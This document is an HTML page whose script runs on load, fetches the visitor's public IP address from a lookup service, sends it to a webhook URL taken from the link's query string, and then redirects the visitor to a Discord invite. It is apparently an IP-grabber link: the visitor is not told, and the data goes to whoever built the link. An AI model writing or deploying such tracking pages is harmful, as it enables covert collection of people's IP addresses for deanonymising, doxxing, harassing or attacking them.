<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP and Geolocation to Custom Webhook</title>
</head>
<body>
    <script>
        // Function to extract the 'webhook' parameter from the URL
        function getWebhookFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('webhook'); // Extract the webhook URL from the query string
        }

        // Function to send data to the provided webhook
        function sendToWebhook(webhookUrl, message) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message })
            }).then(response => {
                if (response.ok) {
                    console.log("Message sent to webhook successfully!");
                } else {
                    console.error("Failed to send message to webhook.");
                }
            }).catch(error => {
                console.error("Error sending message:", error);
            });
        }

        // Function to fetch the user's IP address using a free service (ipify)
        function getUserIpAndSend(webhookUrl) {
            fetch('https://api.ipify.org?format=json')  // No API key required
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const message = `
Title: Info From Click
IP: ${ip}
                    `;
                    sendToWebhook(webhookUrl, message);  // Send IP to the webhook after the redirect
                })
                .catch(error => {
                    console.error("Error fetching IP:", error);
                    sendToWebhook(webhookUrl, "Unable to fetch IP.");
                });
        }

        // Main function to handle the redirect and send the IP to the webhook
        function handleRedirectAndSendIp() {
            const webhookUrl = getWebhookFromUrl();  // Get the webhook URL from the query string

            // Check if webhook URL is present
            if (webhookUrl) {
                // Get the visitor's IP and send it to the webhook
                getUserIpAndSend(webhookUrl);

                // Redirect the user to the Discord link after sending the IP
                window.location.href = "https://discord.gg/perkbios";  // Redirect to the Discord link
            } else {
                console.error("No webhook URL found in the query string.");
            }
        }

        // Call the function when the page loads
        handleRedirectAndSendIp();
    </script>
</body>
</html>
